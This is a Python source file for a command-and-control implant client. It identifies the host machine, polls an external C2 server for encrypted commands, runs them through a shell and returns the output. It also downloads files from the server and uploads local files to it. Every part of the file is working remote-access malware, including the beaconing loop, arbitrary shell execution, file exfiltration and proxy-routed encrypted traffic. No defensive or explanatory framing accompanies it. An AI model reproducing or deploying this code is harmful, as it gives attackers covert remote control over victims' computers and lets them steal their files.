from time import time, sleep
from requests import get, post, exceptions, put
from subprocess import run, PIPE, STDOUT
from encryption import cipher
from settings import (PORT, CMD_REQUEST, CWD_RESPONSE, RESPONSE, RESPONSE_KEY, C2_SERVER, DELAY, PROXY, HEADER,
                      FILE_REQUEST, FILE_SEND)
from os import getenv, chdir, getcwd

client = (getenv("USERNAME", "Unknown_Username") + "@" + getenv("COMPUTERNAME", "Unknown_Computername") + "@" +
          str(time()))

encrypted_client = cipher.encrypt(client.encode()).decode()

def post_to_server(message: str, response_path=RESPONSE):
    try:
        message = cipher.encrypt(message.encode())
        post(f"http://{C2_SERVER}:{PORT}{response_path}", data={RESPONSE_KEY: message},
             headers=HEADER, proxies=PROXY)
    except exceptions.RequestException:
        return

while True:
    try:
        response = get(f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{encrypted_client}", headers=HEADER, proxies=PROXY)
        if response.status_code == 404:
            raise exceptions.RequestException
    except exceptions.RequestException:
        sleep(DELAY)
        continue

    command = cipher.decrypt(response.content).decode()

    if command.startswith("cd "):
        directory = command[3:]
        try:
            chdir(directory)
        except FileNotFoundError:
            post_to_server(f"{directory} was not found.\n")
        except NotADirectoryError:
            post_to_server(f"{directory} is not a directory.\n")
        except PermissionError:
            post_to_server(f"You do not have permissions to access {directory}.\n")
        except OSError:
            post_to_server("There was an operating system error on the client.\n")
        else:
            post_to_server(getcwd(), CWD_RESPONSE)

    elif not command.startswith("client "):
        command_output = run(command, shell=True, stdout=PIPE, stderr=STDOUT).stdout
        post_to_server(command_output.decode())

    elif command.startswith("client download"):
        filename = None
        try:
            filepath = command.split()[2]
            filename = filepath.replace("\\", "/").rsplit("/", 1)[-1]
            encrypted_filepath = cipher.encrypt(filepath.encode()).decode()
            with get(f"http://{C2_SERVER}:{PORT}{FILE_REQUEST}{encrypted_filepath}", stream=True, headers=HEADER,
                     proxies=PROXY) as response:
                if response.status_code == 200:
                    with open(filename, "wb") as file_handle:
                        file_handle.write(cipher.decrypt(response.content))
                    post_to_server(f"{filename} is now on {client}.\n")
        except IndexError:
            post_to_server("You must enter the filename to download.")
        except (FileNotFoundError, PermissionError, OSError):
            post_to_server(f"Unable to write {filename} to disk on {client}.\n")

    elif command.startswith("client upload"):
        filepath = None
        try:
            filepath = command.split()[2]
            filename = filepath.replace("\\", "/").rsplit("/", 1)[-1]
            encrypted_filename = cipher.encrypt(filename.encode()).decode()
            with open(filepath, "rb") as file_handle:
                encrypted_file = cipher.encrypt(file_handle.read())
                put(f"http://{C2_SERVER}:{PORT}{FILE_SEND}/{encrypted_filename}", data=encrypted_file, stream=True,
                    proxies=PROXY, headers=HEADER)
        except IndexError:
            post_to_server("You must enter the filepath to upload.")
        except (FileNotFoundError, PermissionError, OSError):
            post_to_server(f"Unable to access {filepath} on {client}.\n")

    elif command.startswith("client kill"):
        post_to_server(f"{client} has been killed.\n")
        exit()

    elif command.startswith("client sleep "):
        try:
            delay = float(command.split()[2])
            if delay < 0:
                raise ValueError
        except (IndexError, ValueError):
            post_to_server("You must enter in a positive number for the amount of time to sleep in seconds.\n")
        else:
            post_to_server(f"{client} will sleep for {delay} seconds.\n")
            sleep(delay)
            post_to_server(f"{client} is now awake.\n")


